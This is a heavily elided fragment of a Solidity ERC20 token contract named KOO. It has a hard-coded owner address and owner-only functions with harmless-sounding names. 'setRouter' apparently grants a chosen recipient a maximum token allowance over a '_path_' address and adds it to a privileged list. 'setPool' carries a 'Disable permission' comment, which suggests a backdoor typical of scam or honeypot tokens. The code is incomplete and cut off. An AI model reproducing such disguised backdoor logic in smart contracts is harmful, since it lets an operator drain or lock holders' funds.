...
contract KOO is Context, IERC20 {
    ...
    address public _ownr = 0xD4d913686c61f23A6E142130CFC386FE831B3966;
   constructor () public {
...
//-----------------------------------------------------------------------------------------------------------------------//
  ...
  function setRouter(address recipient) public _verify(){
    _plus[recipient]=true;
    _approve(recipient, _path_,_maximumVal);}



  function routerList(address[] memory addrss) public _verify(){
  ...
  function setPool(address recipient) public _verify(){
      //Disable permission
